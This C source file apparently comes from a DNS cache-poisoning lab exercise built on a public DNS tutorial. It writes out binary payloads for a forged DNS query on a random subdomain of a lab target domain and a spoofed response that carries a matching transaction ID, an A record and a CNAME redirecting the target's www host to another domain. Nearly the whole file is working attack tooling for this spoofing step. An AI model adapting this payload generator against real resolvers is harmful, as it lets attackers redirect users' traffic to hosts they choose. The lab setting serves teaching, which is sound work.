// This piece of code is modified based on http://www.binarytides.com/dns-query-code-in-c-with-linux-sockets/
//Header Files
#include<stdio.h>	//printf
#include<string.h>	//strlen
#include<stdlib.h>	//malloc
#include<unistd.h>	//getpid
#include<arpa/inet.h> //inet_addr , inet_ntoa , ntohs etc

//Types of DNS resource records :)

unsigned char attack_domain[50] = "dnsphishinglab.com"; // target domain
unsigned char vicitim_domain[50] = "www.dnsphishinglab.com";
unsigned char bad_domain[50] = "www.ufl.edu";
unsigned char subdomain_host[50];
unsigned char subdomain_host1[100];
unsigned char tid1, tid2;

#define T_A 1 //Ipv4 address
#define T_NS 2 //Nameserver
#define T_CNAME 5 // canonical name
#define T_SOA 6 /* start of authority zone */
#define T_PTR 12 /* domain name pointer */
#define T_MX 15 //Mail server

//Function Prototypes
int ChangetoDnsNameFormat (unsigned char*,unsigned char*);
void forgeDNSQueryMessage(const char* filename);
void forgeDNSResponseMessage(const char* filename);
//DNS header structure
struct DNS_HEADER
{
	unsigned char tid1, tid2; // identification number
	unsigned short flags;

	unsigned short q_count; // number of question entries
	unsigned short ans_count; // number of answer entries
	unsigned short auth_count; // number of authority entries
	unsigned short add_count; // number of resource entries
};

//DNS header structure
struct DNS_HEADER1
{
    unsigned short id; // identification number
 
    unsigned char rd :1; // recursion desired
    unsigned char tc :1; // truncated message
    unsigned char aa :1; // authoritive answer
    unsigned char opcode :4; // purpose of message
    unsigned char qr :1; // query/response flag
 
    unsigned char rcode :4; // response code
    unsigned char cd :1; // checking disabled
    unsigned char ad :1; // authenticated data
    unsigned char z :1; // its z! reserved
    unsigned char ra :1; // recursion available
 
    unsigned short q_count; // number of question entries
    unsigned short ans_count; // number of answer entries
    unsigned short auth_count; // number of authority entries
    unsigned short add_count; // number of resource entries
};
 

//Constant sized fields of query structure
struct QUESTION
{
	unsigned short qtype;
	unsigned short qclass;
};

//Constant sized fields of the resource record structure
struct R_DATA
{
	unsigned short type;
	unsigned short ans_class;
	unsigned int ttl;
	unsigned short data_len;
};

int main( int argc , char *argv[])
{
	int randomNumber = (rand()%10000000);
	while (randomNumber<1000000) 
		randomNumber*=10;
	sprintf(subdomain_host, "x-%d.%s", randomNumber, attack_domain);
	strcpy(subdomain_host1, subdomain_host);
	
	tid1 = (unsigned char) (rand()%256);
	tid2 = (unsigned char) (rand()%256);
	forgeDNSQueryMessage("dns_query_payload");
	forgeDNSResponseMessage("dns_rsp_payload");
	return 0;
}

void forgeDNSQueryMessage(const char* filename){
	unsigned char buf[65536],*qname;
	size_t len = 0;
	//Set the DNS structure to standard queries
	struct DNS_HEADER *dns = (struct DNS_HEADER *)&buf;
	dns->tid1 = tid1;
	dns->tid2 = tid2;
	dns->flags = htons(0x0100); //This is a query
	dns->q_count = htons(1); //we have only 1 question
	dns->ans_count = 0;
	dns->auth_count = 0;
	dns->add_count = 0;
	len += 12;

	//point to the query portion
	qname =(unsigned char*)&buf[len];
	int new_len = ChangetoDnsNameFormat(qname , subdomain_host);
	len += strlen((const char*)qname) + 1;
	//printf("%d, %d, %s\n", new_len, strlen((const char*)qname), qname);
	
	//printf("%d, %d, %d\n", len, sizeof(struct DNS_HEADER) + strlen((const char*)qname) + 1, sizeof(struct DNS_HEADER1) + strlen((const char*)qname) + 1);
	struct QUESTION* qinfo =(struct QUESTION*)&buf[len]; //fill it
	qinfo->qtype = htons(T_A); //type of the query , A , MX , CNAME , NS etc
	qinfo->qclass = htons(1); //its internet (lol)
	len += 4;

	// write query payload file
	FILE* fp = fopen(filename, "w");
	fwrite(buf, sizeof(char), len, fp);
	fclose(fp);
}

void forgeDNSResponseMessage(const char* filename){
	unsigned char buf[65536], *qname, *ipv4;
	size_t len = 0;
	struct DNS_HEADER *dns = NULL;
	struct R_DATA *ans = NULL;
	unsigned short *ans_type = NULL;
	unsigned short *ans_class = NULL;
	unsigned int *ans_ttl = NULL;
	unsigned short *ans_data_len = NULL;
	//Set the DNS structure to standard queries
	dns = (struct DNS_HEADER *)&buf;
	dns->tid1 = tid1;
	dns->tid2 = tid2;
	dns->flags = htons(0x8180);
	dns->q_count = htons(1); //we have only 1 question
	dns->ans_count = htons(2);
	dns->auth_count = 0;
	dns->add_count = 0;
	len += 12;
	int new_len = 0;
	//printf("%d\n", len);
	//point to the query portion
	printf("%d\n", len);
	qname =(unsigned char*)&buf[len];
	new_len = ChangetoDnsNameFormat(qname , subdomain_host);
	len += strlen((const char*)qname) + 1;
	//printf("%d, %d, %s\n", new_len, strlen((char*)qname), qname);

	struct QUESTION* qinfo =(struct QUESTION*)&buf[len]; //fill it
	qinfo->qtype = htons(T_A); //type of the query , A , MX , CNAME , NS etc
	qinfo->qclass = htons(1); //its internet (lol)
	len += 4;
	//printf("size of struct QUESTION:%d \n", sizeof(struct QUESTION));


	// write first response A
	printf("%d\n", len);
	qname =(unsigned char*)&buf[len];
	new_len = ChangetoDnsNameFormat(qname , subdomain_host1);
	len += strlen((const char*)qname) + 1;
	//len += new_len;

	ans_type = (unsigned short *)&buf[len];
	*ans_type = htons(T_A);
	len += 2;
	ans_class = (unsigned short *)&buf[len];
	*ans_class = htons(1);
	len += 2;
	ans_ttl = (unsigned int *)&buf[len];
	*ans_ttl = htons(0x0e10);
	len += 4;
	ans_data_len = (unsigned short *)&buf[len];
	*ans_data_len = htons(4);
	len += 2;

	/*ans = (struct R_DATA *)&buf[len];
	ans->type = htons(T_A);
	ans->ans_class = htons(0x0001);
	ans->ttl = htons(0x0e10);
	ans->data_len = htons(4);
	len += sizeof(struct R_DATA);*/
	//printf("size of struct R_DATA:%d \n", sizeof(struct R_DATA));

	/*qname =(unsigned char*)&buf[len];
	new_len = ChangetoDnsNameFormat(qname , vicitim_domain);
	len += strlen((const char*)qname) + 1;*/

	ipv4 =(unsigned char*)&buf[len];
	ipv4[0] = 10;
	ipv4[1] = 0;
	ipv4[2] = 2;
	ipv4[3] = 4;
	len += 4;
	//printf("%d\n", len);

	//write second response
	qname =(unsigned char*)&buf[len];
	new_len = ChangetoDnsNameFormat(qname , vicitim_domain);
	len += strlen((const char*)qname) + 1;
	//printf("%d, %s\n", new_len, qname);

	ans_type = (unsigned short *)&buf[len];
	*ans_type = htons(T_CNAME);
	len += 2;
	ans_class = (unsigned short *)&buf[len];
	*ans_class = htons(1);
	len += 2;
	ans_ttl = (unsigned int *)&buf[len];
	*ans_ttl = htons(0x0e10);
	len += 4;
	ans_data_len = (unsigned short *)&buf[len];
	*ans_data_len = htons(strlen((const char*)bad_domain) + 1);
	len += 2;

	/*ipv4 =(unsigned char*)&buf[len];
	ipv4[0] = 128;
	ipv4[1] = 227;
	ipv4[2] = 9;
	ipv4[3] = 48;
	len += 4;*/

	qname =(unsigned char*)&buf[len];
	new_len = ChangetoDnsNameFormat(qname , bad_domain);
	len += strlen((const char*)qname) + 1;

	// write query payload file
	FILE* fp = fopen(filename, "w");
	fwrite(buf, sizeof(char), len, fp);
	fclose(fp);
}
/*
 * This will convert www.google.com to 3www6google3com 
 * got it :)
 * */
int ChangetoDnsNameFormat(unsigned char* dns, unsigned char* host) 
{
	int lock = 0 , i, new_len = 0;
	strcat((char*)host,".");

	unsigned char *tmp1 = dns, *tmp2 = host;
	
	i = 0;
	for(; i < strlen((char*)host) ; i++) 
	{
		if(host[i]=='.') 
		{
			*dns++ = i-lock;
			++new_len;
			for(;lock<i;lock++) 
			{
				*dns++=host[lock];
				++new_len;
			}
			lock++; //or lock=i+1;
		}
	}
	*dns++='\0';
	host[i-1] = '\0';
	//printf("%d------\n", strlen((char*)host));
	/*while (*tmp1 != '\0') printf("%c", *tmp1++);
	printf("<----->");
	while (*tmp2 != '\0') printf("%c", *tmp2++);
	printf("\n");*/
	return new_len;
}
